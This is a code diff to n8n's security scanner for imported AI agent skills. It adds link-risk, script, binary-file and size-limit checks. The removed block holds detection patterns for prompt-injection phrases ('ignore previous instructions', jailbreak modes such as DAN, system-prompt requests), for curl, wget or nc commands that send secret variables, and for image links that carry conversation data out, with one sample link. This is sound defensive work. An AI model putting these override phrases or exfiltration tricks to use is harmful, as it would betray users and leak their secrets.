@@ -1,10 +1,23 @@
-import { agentSkillSchema, type SkillScanFinding } from '@n8n/api-types';
+import {
+	AGENT_SKILL_REFERENCE_MAX_COUNT,
+	AGENT_SKILL_REFERENCES_TOTAL_MAX_LENGTH,
+	agentSkillSchema,
+	type SkillLinkReviewReason,
+	type SkillScanFinding,
+	type SkillScanLimit,
+	type SkillScanLimitField,
+	type SkillScanLocation,
+} from '@n8n/api-types';
 import { kebabCase } from 'change-case';
+import get from 'lodash/get';
 import { isDeepStrictEqual } from 'node:util';
 import type { ZodIssue } from 'zod';
 
 import type { SkillContent } from './skill-content-hash';
+import { extractSkillLinks, linkReviewReason } from './skill-link-review-policy';
 import { SKILL_MD } from './skill-md';
+import { codePointOf, HIDDEN_PATTERN, locate, skillMdText } from './skill-text';
+import { isScriptFile, isTextFile } from './skipped-files';
 import type { SkillSourceFidelityWarning } from '../sources/skill-source-client';
 
 /**
@@ -17,159 +30,312 @@ const FRONTMATTER_MAX_LENGTH = 16_384;
 export type SkillScanInput = {
 	content: SkillContent;
 	skippedFiles: string[];
+	/** The skipped files that n8n cannot store. */
+	unstorableFiles?: string[];
+	oversizedFiles?: string[];
+	/** The skipped files that fit alone, but not within the limits of one skill. */
+	overLimitFiles?: string[];
 	fidelity: SkillSourceFidelityWarning[];
 	/** The content of the latest version. Null at import. */
 	previous: SkillContent | null;
 };
 
 /** The skill must fit the shape that `createTrusted` and `saveTrusted` store. */
-export function checkShape({ content }: SkillScanInput): SkillScanFinding[] {
-	const parsed = agentSkillSchema.safeParse({
+export function checkShape({ content }: Pick<SkillScanInput, 'content'>): SkillScanFinding[] {
+	const input = {
 		// The service trims these, so a value of only spaces is empty.
 		name: content.name.trim(),
 		description: content.description.trim(),
 		instructions: content.instructions.trim(),
 		...(content.files.length ? { references: content.files } : {}),
-	});
+	};
+	const parsed = agentSkillSchema.safeParse(input);
 	const findings: SkillScanFinding[] = parsed.success
 		? []
-		: parsed.error.issues.map((issue) => ({
-				rule: isSizeIssue(issue) ? 'over_limit' : 'invalid_skill',
-				severity: 'blocked',
-				file: fileOfIssue(content, issue.path),
-				detail: issue.message,
-			}));
-	if (content.frontmatter && JSON.stringify(content.frontmatter).length > FRONTMATTER_MAX_LENGTH) {
-		findings.push({
-			rule: 'over_limit',
-			severity: 'blocked',
-			file: SKILL_MD,
-			detail: `The frontmatter must be ${FRONTMATTER_MAX_LENGTH} characters or fewer as JSON.`,
-		});
+		: parsed.error.issues.map<SkillScanFinding>((issue) => {
+				const file = fileOfIssue(content, issue.path);
+				const limit = limitOf(content, input, issue);
+				return limit
+					? overLimit(file, limit)
+					: {
+							rule: 'invalid_skill',
+							severity: 'blocked',
+							file,
+							detail: emptyDetail(issue) ?? issue.message,
+						};
+			});
+	const frontmatterLength = content.frontmatter ? JSON.stringify(content.frontmatter).length : 0;
+	if (frontmatterLength > FRONTMATTER_MAX_LENGTH) {
+		findings.push(
+			overLimit(SKILL_MD, {
+				field: 'frontmatter',
+				max: FRONTMATTER_MAX_LENGTH,
+				current: frontmatterLength,
+			}),
+		);
 	}
 	return findings;
 }
 
-/**
- * A skill keeps only SKILL.md and `references/*.md`. The SKILL.md reader leaves out every other
- * file, scripts and binaries included, so n8n never stores or runs them. The user sees the list.
- */
-export function listSkippedFiles({ skippedFiles }: SkillScanInput): SkillScanFinding[] {
-	return skippedFiles.map((file) => ({
-		rule: 'file_skipped',
-		severity: 'info',
+/** The English text of each limit, for the `detail` of a finding. The UI writes its own from `limit`. */
+const LIMIT_DETAIL: Record<SkillScanLimitField, (limit: SkillScanLimit) => string> = {
+	name: ({ max, current }) =>
+		`The name can have at most ${max} characters. It has ${current} characters.`,
+	description: ({ max, current }) =>
+		`The description can have at most ${max} characters. It has ${current} characters.`,
+	instructions: ({ max, current }) =>
+		`The instructions can have at most ${max} characters. They have ${current} characters.`,
+	frontmatter: ({ max, current }) =>
+		`The frontmatter can have at most ${max} characters as JSON. It has ${current} characters.`,
+	referenceCount: ({ max, current }) =>
+		`A skill can have at most ${max} reference files. It has ${current} files.`,
+	referencePath: ({ max, current }) =>
+		`The path of a reference file can have at most ${max} characters. It has ${current} characters.`,
+	referenceContent: ({ max, current }) =>
+		`A reference file can have at most ${max} characters. It has ${current} characters.`,
+	referencesTotal: ({ max, current }) =>
+		`The reference files can have at most ${max} characters in total. They have ${current} characters.`,
+};
+
+function overLimit(file: string, limit: SkillScanLimit): SkillScanFinding {
+	return {
+		rule: 'over_limit',
+		severity: 'blocked',
 		file,
-		detail: 'n8n leaves this file out. A skill keeps only SKILL.md and references/*.md.',
-	}));
+		detail: LIMIT_DETAIL[limit.field](limit),
+		limit,
+	};
 }
 
+const TEXT_FIELDS: Record<string, SkillScanLimitField> = {
+	name: 'name',
+	description: 'description',
+	instructions: 'instructions',
+};
+
 /**
- * Characters that a reviewer cannot see but a model reads: zero-width and format characters,
- * bidirectional controls, Unicode tags, and C0 and C1 controls other than tab and line breaks.
- * Binary data read as text has controls too. The zero-width joiner and the variation
- * selectors U+FE00 to U+FE0F stay allowed, because emoji use them.
+ * The limit that an issue of the skills schema reports. The total size of the references is a
+ * custom issue on the list itself. The other custom issue of the list, a duplicate path, is on
+ * one entry.
  */
-const HIDDEN_RANGES: Array<[number, number]> = [
-	[0x0000, 0x0008],
-	[0x000b, 0x000c],
-	[0x000e, 0x001f],
-	[0x007f, 0x009f],
-	[0x00ad, 0x00ad], // soft hyphen
-	[0x034f, 0x034f], // combining grapheme joiner
-	[0x061c, 0x061c], // Arabic letter mark
-	[0x115f, 0x1160], // Hangul fillers
-	[0x17b4, 0x17b5],
-	[0x180e, 0x180e],
-	[0x200b, 0x200c], // zero-width space and non-joiner
-	[0x200e, 0x200f], // left-to-right and right-to-left marks
-	[0x202a, 0x202e], // bidirectional embeddings and overrides
-	[0x2060, 0x2064],
-	[0x2066, 0x206f], // bidirectional isolates and deprecated format characters
-	[0x3164, 0x3164],
-	[0xfeff, 0xfeff],
-	[0xffa0, 0xffa0],
-	[0xfff9, 0xfffb],
-	[0x1bca0, 0x1bca3], // shorthand format controls
-	[0x1d173, 0x1d17a], // musical symbol format controls
-	[0xe0000, 0xe007f], // Unicode tags
-	[0xe0100, 0xe01ef], // variation selectors supplement
-];
+function limitOf(
+	content: SkillContent,
+	input: object,
+	issue: ZodIssue,
+): SkillScanLimit | undefined {
+	const [field, , part] = issue.path;
+	if (issue.code === 'custom') {
+		return field === 'references' && issue.path.length === 1
+			? {
+					field: 'referencesTotal',
+					max: AGENT_SKILL_REFERENCES_TOTAL_MAX_LENGTH,
+					current: content.files.reduce((total, file) => total + file.content.length, 0),
+				}
+			: undefined;
+	}
+	if (issue.code !== 'too_big') return undefined;
+	const value: unknown = get(input, issue.path);
+	const limitField =
+		field !== 'references'
+			? TEXT_FIELDS[String(field)]
+			: issue.path.length === 1
+				? 'referenceCount'
+				: part === 'path'
+					? 'referencePath'
+					: 'referenceContent';
+	if (!limitField || (typeof value !== 'string' && !Array.isArray(value))) return undefined;
+	return { field: limitField, max: Number(issue.maximum), current: value.length };
+}
 
-const toClassRange = ([first, last]: [number, number]) =>
-	`\\u{${first.toString(16)}}-\\u{${last.toString(16)}}`;
+/** The schema has no message of its own for an empty text, so the finding names the field. */
+function emptyDetail(issue: ZodIssue): string | undefined {
+	if (issue.code !== 'too_small') return undefined;
+	const [field, , part] = issue.path;
+	if (field === 'name') return 'The name is empty.';
+	if (field === 'description') return 'The description is empty.';
+	if (field === 'references' && part === 'path') return 'The reference file has no path.';
+	return undefined;
+}
 
-/** The ranges as one character class, so a scan collects only the hidden characters. */
-const HIDDEN_PATTERN = new RegExp(`[${HIDDEN_RANGES.map(toClassRange).join('')}]`, 'gu');
+/** The user sees why a file was left out. A missing script or code file needs review. */
+export function listSkippedFiles({
+	skippedFiles,
+	unstorableFiles = [],
+	oversizedFiles = [],
+	overLimitFiles = [],
+}: SkillScanInput): SkillScanFinding[] {
+	const unstorable = new Set(unstorableFiles);
+	const oversized = new Set(oversizedFiles);
+	const overLimit = new Set(overLimitFiles);
+	return skippedFiles.map((file) => {
+		const severity = isScriptFile(file) ? 'needs_review' : 'info';
+		if (unstorable.has(file)) {
+			return {
+				rule: 'file_unstorable',
+				severity,
+				file,
+				detail: 'n8n cannot store this file path.',
+			};
+		}
+		if (oversized.has(file)) {
+			return {
+				rule: 'file_too_large',
+				severity,
+				file,
+				detail: 'The file is over the size limit of 1 MiB for one file.',
+			};
+		}
+		if (overLimit.has(file)) {
+			return {
+				rule: 'file_over_skill_limit',
+				severity,
+				file,
+				detail: `n8n left this file out. A skill keeps at most ${AGENT_SKILL_REFERENCE_MAX_COUNT} files and ${AGENT_SKILL_REFERENCES_TOTAL_MAX_LENGTH / (1024 * 1024)} MiB of file content.`,
+			};
+		}
+		return { rule: 'file_skipped', severity, file, detail: 'n8n left this file out.' };
+	});
+}
 
 export function findHiddenUnicode(input: SkillScanInput): SkillScanFinding[] {
 	return textsByFile(input.content).flatMap(({ file, texts }) => {
-		const found = texts.flatMap((text) => text.match(HIDDEN_PATTERN) ?? []);
+		const found = texts.flatMap(({ text }) => text.match(HIDDEN_PATTERN) ?? []);
 		if (found.length === 0) return [];
+		const first = texts.find(({ text }) => text.search(HIDDEN_PATTERN) >= 0);
+		const index = first?.text.search(HIDDEN_PATTERN) ?? 0;
 		return [
 			{
 				rule: 'hidden_unicode',
 				severity: 'needs_review',
 				file,
 				detail: `${found.length} invisible or control characters. The first is ${codePointOf(found[0])}.`,
+				...(first ? { location: first.locate(index, index + found[0].length) } : {}),
 			},
 		];
 	});
 }
 
-/**
- * A link up to the first character that cannot be part of it. An IPv6 host sits in brackets,
- * which the rest of a link cannot hold, so it has its own group after the optional user info.
- */
-const URL_PATTERN =
-	/\b(?:https?|wss?|ftp):\/\/(?:[^\s<>"'`()[\]{}/?#@]*@)?(?:\[[\d:a-f.]+\])?[^\s<>"'`()[\]{}]*/gi;
-
-/**
- * A new domain can be a place where a model sends data, so an update with a domain that the
- * previous version did not have needs review. A new link on a known domain does not. At
- * import there is no previous version, so each domain is only listed.
- */
-export function findNewUrls({ content, previous }: SkillScanInput): SkillScanFinding[] {
-	const known = previous ? new Set(domainsByFile(previous).keys()) : new Set<string>();
-	return [...domainsByFile(content)]
-		.filter(([domain]) => !known.has(domain))
-		.map(([domain, file]) =>
-			previous
-				? {
-						rule: 'new_url',
-						severity: 'needs_review',
-						file,
-						domain,
-						detail: `The update links to ${domain}, a domain that the current version does not use.`,
-					}
-				: {
-						rule: 'new_url',
-						severity: 'info',
-						file,
-						domain,
-						detail: `The skill links to ${domain}.`,
-					},
-		);
+export function findScriptChanges({ content, previous }: SkillScanInput): SkillScanFinding[] {
+	const before = new Map(previous?.files.map((file) => [file.path, file]));
+	return content.files.flatMap(({ path, content: text, isBinary }) => {
+		// A text file that starts with `#!` is a script, whatever its name and folder are.
+		const isScript = isScriptFile(path) || path.startsWith('scripts/');
+		if (!isScript && (isBinary || !text.startsWith('#!'))) return [];
+		const old = before.get(path);
+		if (old?.content === text && old.isBinary === isBinary) return [];
+		return [
+			{
+				rule: 'script_file',
+				severity: 'needs_review',
+				file: path,
+				detail: 'Review this script before you use the skill.',
+			},
+		];
+	});
 }
 
-/** Each domain that the skill links to, with the first file that has it. */
-function domainsByFile(content: SkillContent): Map<string, string> {
-	const domains = new Map<string, string>();
+/** Text file types. A file with one of these names that is not UTF-8 text is not what it claims. */
+/** `#!` as Base64. A file that starts with it is a script for the operating system. */
+const SHEBANG_BASE64 = /^Iy[E-H]/;
+
+/**
+ * The scanner reads text only, so the rules for hidden characters and links do not see a
+ * binary file. The reviewer learns of each new or changed binary file. One that has a text or
+ * script name, or starts like a script, needs review: another tool can still read it as text.
+ */
+export function findUnscannedBinaryFiles({
+	content,
+	previous,
+}: SkillScanInput): SkillScanFinding[] {
+	const before = new Map(previous?.files.map((file) => [file.path, file]));
+	return content.files.flatMap(({ path, content: base64, isBinary }) => {
+		if (!isBinary) return [];
+		const old = before.get(path);
+		if (old?.isBinary && old.content === base64) return [];
+		const looksLikeText = isTextFile(path) || isScriptFile(path) || SHEBANG_BASE64.test(base64);
+		return [
+			{
+				rule: 'binary_file',
+				severity: looksLikeText ? 'needs_review' : 'info',
+				file: path,
+				detail: looksLikeText
+					? 'n8n did not check this file, because it is not UTF-8 text. Its name or its start says that it is text or a script. Agents cannot read it.'
+					: 'n8n did not check this binary file. Agents cannot read it.',
+			},
+		];
+	});
+}
+
+/** The English text of each reason, for the `detail` of a finding. */
+const LINK_REASON_DETAIL: Record<SkillLinkReviewReason, string> = {
+	ip_address: 'it uses an IP address',
+	not_https: 'it does not use HTTPS',
+	paste_site: 'it uses a paste site',
+	webhook_catcher: 'it uses a webhook catcher',
+	url_shortener: 'it uses a URL shortener',
+	unreadable: 'n8n cannot read its address',
+};
+
+/**
+ * An update needs review if it links to a new domain. At import, list each domain and flag
+ * destinations that need review even without a previous version.
+ */
+export function findNewUrls({ content, previous }: SkillScanInput): SkillScanFinding[] {
+	const known = previous ? domainsByFile(previous) : undefined;
+	return [...domainsByFile(content, !previous)]
+		.filter(([key]) => !known?.has(key))
+		.map(([key, { file, locate, domain, reviewReason }]) => ({
+			rule: reviewReason ? 'risky_url' : 'new_url',
+			severity: previous || reviewReason ? 'needs_review' : 'info',
+			file,
+			...(domain ? { domain } : {}),
+			...(reviewReason ? { linkReason: reviewReason } : {}),
+			detail: previous
+				? `The update links to ${key}, a domain that the current version does not use.`
+				: reviewReason
+					? `The link ${domain ? `to ${domain}` : key} needs review because ${LINK_REASON_DETAIL[reviewReason]}.`
+					: `The skill links to ${domain}.`,
+			location: locate(),
+		}));
+}
+
+/** `domain` is absent for a link with an address that n8n cannot read. */
+type DomainOccurrence = {
+	file: string;
+	locate: () => SkillScanLocation;
+	domain?: string;
+	reviewReason?: SkillLinkReviewReason;
+};
+
+/**
+ * Keep the first link per domain. At import, prefer the first link that needs review. A link
+ * with an address that n8n cannot read has its text as the key, and counts only at import.
+ */
+function domainsByFile(
+	content: SkillContent,
+	checkImportRisk = false,
+): Map<string, DomainOccurrence> {
+	const domains = new Map<string, DomainOccurrence>();
 	for (const { file, texts } of textsByFile(content)) {
-		for (const match of texts.flatMap((text) => text.match(URL_PATTERN) ?? [])) {
-			const domain = domainOf(match);
-			if (domain && !domains.has(domain)) domains.set(domain, file);
+		for (const entry of texts) {
+			for (const { link, start, end, url, domain } of extractSkillLinks(entry.text)) {
+				if (!domain && !checkImportRisk) continue;
+				const key = domain || link;
+				const existing = domains.get(key);
+				if (existing && (!checkImportRisk || existing.reviewReason)) continue;
+				const reviewReason = checkImportRisk ? linkReviewReason(url, domain) : undefined;
+				if (existing && !reviewReason) continue;
+				domains.set(key, {
+					file,
+					domain,
+					reviewReason,
+					// Resolve the location only for links that produce a finding.
+					locate: () => entry.locate(start, end),
+				});
+			}
 		}
 	}
 	return domains;
-}
-
-function domainOf(url: string): string | undefined {
-	try {
-		// A dot that ends a sentence can follow the host, as in "see https://example.com."
-		return new URL(url).hostname.toLowerCase().replace(/\.+$/, '') || undefined;
-	} catch {
-		return undefined;
-	}
 }
 
 /**
@@ -203,6 +369,7 @@ export function findPermissionChanges({ content, previous }: SkillScanInput): Sk
 			severity: 'info',
 			file: SKILL_MD,
 			detail: `The skill sets the frontmatter key ${key}.`,
+			location: locateKey(content, key),
 		}));
 	}
 	const before = permissionKeys(previous);
@@ -219,7 +386,11 @@ export function findPermissionChanges({ content, previous }: SkillScanInput): Sk
 			: !current.has(key)
 				? `The update removes the frontmatter key ${key}.`
 				: `The update changes the frontmatter key ${key}.`;
-		return [{ rule: 'permission_change', severity: 'needs_review', file: SKILL_MD, detail }];
+		// A removed key is not in the update, so the finding has no place in it.
+		const location = current.has(key) ? { location: locateKey(content, key) } : {};
+		return [
+			{ rule: 'permission_change', severity: 'needs_review', file: SKILL_MD, detail, ...location },
+		];
 	});
 }
 
@@ -235,137 +406,6 @@ function permissionKeys(content: SkillContent): Map<string, unknown> {
 	);
 }
 
-/**
- * Phrases that try to take over the model, hide actions from the user, or send data away. A
- * match is a hint for a reviewer, not proof: a skill about security can quote them.
- */
-const SUSPICIOUS_PHRASES: Array<{ label: string; find: (text: string) => string | undefined }> = [
-	{
-		label: 'an instruction override',
-		find: firstMatch(
-			/\b(?:ignore|disregard|forget|override)\b[^.\n]{0,40}\b(?:previous|prior|above|earlier|preceding|system|all|any|other)\b[^.\n]{0,20}\b(?:instructions?|prompts?|rules|guidelines|messages)\b/i,
-		),
-	},
-	{
-		label: 'an action hidden from the user',
-		find: firstMatch(
-			/\bwithout\s+(?:telling|informing|asking|notifying|alerting)\s+the\s+user\b|\b(?:do\s+not|don't|never)\s+(?:tell|inform|notify|alert)\s+the\s+user\s+(?:about|that|of)\b|\bkeep\s+(?:this|it)\s+(?:secret|hidden)\s+from\s+the\s+user\b/i,
-		),
-	},
-	{
-		label: 'a request for the system prompt',
-		find: firstMatch(
-			/\b(?:reveal|print|output|show|repeat|dump|leak)\b[^.\n]{0,30}\b(?:system\s+prompt|hidden\s+instructions|initial\s+instructions|developer\s+message)\b/i,
-		),
-	},
-	{
-		label: 'a chat role tag',
-		find: firstMatch(
-			/<\|\s*(?:im_start|im_end|system|endoftext)\s*\|>|\[\/?INST\]|<\/?\s*system\s*>/i,
-		),
-	},
-	{
-		label: 'a jailbreak mode',
-		find: firstMatch(
-			/\b(?:you\s+are\s+now|act\s+as|enter|switch\s+to)\b[^.\n]{0,20}\b(?:DAN|jailbreak|developer\s+mode|unrestricted|god\s+mode)\b/i,
-		),
-	},
-	{
-		label: 'a request to send secrets',
-		find: firstMatch(
-			/\b(?:send|post|upload|forward|exfiltrate|transmit|leak|e-?mail)\b[^.\n]{0,60}(?:credentials?|api[ _-]?keys?|(?:access|auth|bearer|session|refresh|github|api)[ _-]?tokens?|secrets?|passwords?|private[ _-]?keys?|ssh[ _-]?keys?|~\/\.ssh|cookies|session[ _-]?ids?|env(?:ironment)?[ _-]?var(?:iable)?s|\.env\b)/i,
-		),
-	},
-	{
-		label: 'a secret in a network command',
-		find: firstMatch(
-			/\b(?:curl|wget|Invoke-WebRequest|Invoke-RestMethod|nc|ncat)\b[^\n]{0,200}\$\{?[A-Za-z_]{0,40}(?:KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL)/,
-		),
-	},
-	{ label: 'an image link that carries data', find: findDataImageLink },
-];
-
-function firstMatch(pattern: RegExp): (text: string) => string | undefined {
-	return (text) => pattern.exec(text)?.[0];
-}
-
-/** A placeholder in a URL: `{{name}}`, `${name}`, `{name}` or `%7B`, which is an encoded "{". */
-const URL_PLACEHOLDER = /\{\{|\$\{|\{[a-z_]+\}|%7B/i;
-
-/**
- * An image link with a placeholder in its URL, such as
- * `![status](https://example.com/p.png?d={{conversation}})`. The model fills in the data, and
- * the chat sends it away when it shows the image. The alt text goes to the first "]", and the
- * URL goes to the first ")" or space. The scan reads each character at most a few times, so the
- * time is linear in the length of the text, with no limit on the alt text or the URL.
- */
-function findDataImageLink(text: string): string | undefined {
-	const tokens = /!\[|\]/g;
-	const linkStart = /\(\s*https?:\/\//iy;
-	const urlChars = /[^)\s]*/y;
-	let opener: number | undefined;
-	// The URLs read so far end before this offset and have no placeholder.
-	let readUntil = 0;
-	for (let token = tokens.exec(text); token; token = tokens.exec(text)) {
-		if (token[0] === '![') {
-			opener ??= token.index;
-			continue;
-		}
-		const start = opener;
-		opener = undefined;
-		if (start === undefined) continue;
-		linkStart.lastIndex = token.index + 1;
-		if (!linkStart.test(text)) continue;
-		const afterScheme = linkStart.lastIndex;
-		// A URL that starts inside a URL already read ends at the same place, so it has no
-		// placeholder either.
-		if (afterScheme < readUntil) continue;
-		urlChars.lastIndex = afterScheme;
-		urlChars.test(text);
-		readUntil = urlChars.lastIndex;
-		const placeholder = URL_PLACEHOLDER.exec(text.slice(afterScheme, readUntil));
-		if (placeholder) {
-			return text.slice(start, afterScheme + placeholder.index + placeholder[0].length);
-		}
-	}
-	return undefined;
-}
-
-/**
- * A match of each phrase kind needs review, once for each file. Markdown shows a line break
- * inside a paragraph as a space, so the patterns read such lines as one line.
- */
-export function findSuspiciousPhrases({ content }: SkillScanInput): SkillScanFinding[] {
-	return textsByFile(content).flatMap(({ file, texts }) => {
-		const joined = texts.map(joinSoftBreaks);
-		return SUSPICIOUS_PHRASES.flatMap(({ label, find }) => {
-			const match = joined.map((text) => find(text)).find((found) => found !== undefined);
-			if (match === undefined) return [];
-			return [
-				{
-					rule: 'suspicious_phrase',
-					severity: 'needs_review',
-					file,
-					detail: `The text has ${label}: "${excerpt(match)}".`,
-				},
-			];
-		});
-	});
-}
-
-/**
- * Joins a line to the next one when the next one goes on with text. A list item, a heading,
- * a quote and a blank line do not start with a letter, so they stay on their own line.
- */
-function joinSoftBreaks(text: string): string {
-	return text.replace(/\n(?=[ \t]*\p{L})/gu, ' ');
-}
-
-function excerpt(text: string): string {
-	const flat = text.replace(/\s+/g, ' ');
-	return flat.length > 80 ? `${flat.slice(0, 77)}...` : flat;
-}
-
 /** The source could not convert every part of the skill, so the reviewer reads what is left. */
 export function listFidelityWarnings({ fidelity }: SkillScanInput): SkillScanFinding[] {
 	return fidelity.map(({ detail }) => ({
@@ -375,20 +415,50 @@ export function listFidelityWarnings({ fidelity }: SkillScanInput): SkillScanFin
 	}));
 }
 
+/** One text that the rules read, and how to place a range of it in the file that the review shows. */
+type ScanText = { text: string; locate: (start: number, end: number) => SkillScanLocation };
+
 /** Every text of a skill, by file. SKILL.md holds the name, description, frontmatter and instructions. */
-function textsByFile(content: SkillContent): Array<{ file: string; texts: string[] }> {
+function textsByFile(content: SkillContent): Array<{ file: string; texts: ScanText[] }> {
+	const md = skillMdText(content);
+	const inSkillMd = (text: string, offset: number): ScanText => ({
+		text,
+		locate: (start, end) => locate(md.text, offset + start, offset + end),
+	});
+	// A frontmatter value shows as JSON, which escapes some characters, so a finding in it
+	// marks its top-level key.
+	const frontmatter = Object.entries(content.frontmatter ?? {}).flatMap(([key, value]) =>
+		[key, ...stringsIn(value)].map((text) => ({ text, locate: () => locateKey(content, key) })),
+	);
 	return [
 		{
 			file: SKILL_MD,
 			texts: [
-				content.name,
-				content.description,
-				...stringsIn(content.frontmatter),
-				content.instructions,
+				inSkillMd(content.name, md.name),
+				inSkillMd(content.description, md.description),
+				...frontmatter,
+				inSkillMd(content.instructions, md.instructions),
 			],
 		},
-		...content.files.map((file) => ({ file: file.path, texts: [file.content] })),
+		...content.files
+			.filter((file) => !file.isBinary)
+			.map((file) => ({
+				file: file.path,
+				texts: [
+					{
+						text: file.content,
+						locate: (start: number, end: number) => locate(file.content, start, end),
+					},
+				],
+			})),
 	];
+}
+
+/** A top-level frontmatter key on its line of SKILL.md. */
+function locateKey(content: SkillContent, key: string): SkillScanLocation {
+	const md = skillMdText(content);
+	const offset = md.keys.get(key) ?? 0;
+	return locate(md.text, offset, offset + key.length);
 }
 
 /** The keys and string values of a frontmatter value, at every level. */
@@ -399,21 +469,6 @@ function stringsIn(value: unknown): string[] {
 		return Object.entries(value).flatMap(([key, entry]) => [key, ...stringsIn(entry)]);
 	}
 	return [];
-}
-
-function codePointOf(character: string): string {
-	return `U+${(character.codePointAt(0) ?? 0).toString(16).toUpperCase().padStart(4, '0')}`;
-}
-
-/**
- * The total size of the references is a custom issue on the list itself. The other custom
- * issue of the list, a duplicate path, is on one entry.
- */
-function isSizeIssue(issue: ZodIssue): boolean {
-	return (
-		issue.code === 'too_big' ||
-		(issue.code === 'custom' && issue.path.length === 1 && issue.path[0] === 'references')
-	);
 }
 
 /** Issues under `references` name the file. Every other field is in SKILL.md. */
